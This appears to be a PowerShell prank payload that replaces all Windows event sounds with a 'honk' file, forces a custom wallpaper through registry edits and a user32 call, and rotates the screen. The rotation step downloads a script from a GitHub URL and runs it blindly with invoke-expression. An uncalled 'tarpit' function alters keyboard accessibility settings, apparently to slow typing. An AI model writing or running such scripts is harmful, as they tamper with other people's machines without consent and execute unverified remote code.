$honkDir = ([system.environment]::GetFolderPath("Desktop") + "\honk\")
mkdir $honkDir
#region soundb64
$honk64 = ""
#endregion soundb64

#region wallpaperb64
$wall64 = ""
#endregion wallpaperb64

$honkBytes = [System.Convert]::FromBase64String($honk64)
$honkFile = ($honkDir + "honk.wav")
$wallBytes = [System.Convert]::FromBase64String($wall64)
$wallFile = ($honkDir + "honk.jpg")
$honkBytes | set-content $honkFile -encoding byte
$wallBytes | set-content $wallFile -encoding byte

function rotate-screen{
    $rotateScript = (invoke-webrequest "https://raw.githubusercontent.com/Clicketyclick/ChangeScreenOrientation/master/ChangeOrientation.ps1").content
    invoke-expression $rotateScript
}
function mighty-honk{
    get-item HKCU:\AppEvents\Schemes\Apps\*\*\.current |%{set-item -path $_.pspath -value $honkFile}

}
function sad-honk{
    get-item HKCU:\AppEvents\Schemes\Apps\*\*\.current | %{echo $_.pspath.toupper().replace(".CURRENT",".default");set-item -path $_.pspath -value ((get-item ($_.pspath.toupper().replace(".CURRENT",".default"))).getValue(""))}

    get-item HKCU:\AppEvents\Schemes\Apps\*\*\.current | where-object {$_.getValue("") -like "*\honk.wav"} | %{set-item -path $_.pspath -value ""}
}

function tarpit{
    set-itemproperty "hkcu:\Control Panel\Accessibility\Keyboard Response" -name flags -value 123
}

function dishsoap{
    set-itemproperty "hkcu:\Control Panel\Accessibility\Keyboard Response" -name flags -value 122
}

function wallpaper{
    #Hashtable of values for setting wallpaper styles
    $WallpaperStyleValues = @{
        "Fill" = @(10,0);
        "Fit" = @(6,0);
        "Stretch" = @(2,0);
        "Span" = @(22,0);
        "Tile" = @(0,1);
        "Center" = @(0,0)
    }
    [string]$style = "Fill"
    reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d $wallFile /f > $null
    #Set the wallpaper style details
    reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d $WallpaperStyleValues[$style][0] /f > $null
    reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d $WallpaperStyleValues[$style][1] /f > $null
    #Create minimalist User32 interface class
    try {
        Add-Type @"
            using System;
            using System.Runtime.InteropServices;
            using Microsoft.Win32;
            namespace Wallpaper
            {

                public class Setter
                {
                    [DllImport( "user32.dll", SetLastError = true, CharSet = CharSet.Auto )]
                    private static extern int SystemParametersInfo ( int uAction, int uParam, string lpvParam, int fuWinIni );
                    public static void SetWallpaper ( string path )
                    {
                        SystemParametersInfo( 20, 0, path, 0x1 | 0x2 );
                    }
                }
            }
"@
    } catch {}
    #Set wallpaper with API
    [Wallpaper.Setter]::SetWallpaper($wallFile)
    # sometimes the wallpaper only changes after the second run, so I'll run it twice!
    sleep -ms 200
    [Wallpaper.Setter]::SetWallpaper($wallFile)
    #Refresh wallpaper
    rundll32.exe user32.dll, UpdatePerUserSystemParameters > $null
}
mighty-honk
wallpaper
echo `a
rotate-screen
